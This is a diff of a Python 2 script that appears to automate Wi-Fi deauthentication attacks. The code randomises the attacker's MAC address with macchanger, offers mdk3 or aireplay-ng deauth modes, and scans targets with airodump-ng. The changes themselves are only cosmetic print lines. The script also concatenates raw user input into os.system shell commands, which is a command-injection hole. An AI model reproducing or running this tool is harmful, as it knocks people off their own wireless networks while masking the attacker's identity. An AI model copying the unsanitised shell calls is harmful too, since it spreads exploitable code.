@@ -32,22 +32,20 @@ os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monit
 os.system('cat -n monitor.rmo')
 monitor = raw_input("Select you wirelles card fo monitor mode: ")
 os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
+print("")
+
+print("Changing the MAC")
 os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
 
 
-
+print("")
 print("List of avaliable attack mod: ")
 print("[1] Mdk3 Deauth / Disassociation")
 print("[2] Aireplay-ng Deauth")
 attack = raw_input("Select one mod fo the attack: ")
-
+print("")
 
 print("Listing avaliable wireless network for attack: ")
-print(".")
-print("..")
-print("...")
-print("....")
-
 os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")
 
 target = raw_input("Select one ESSID for start the attack: ")
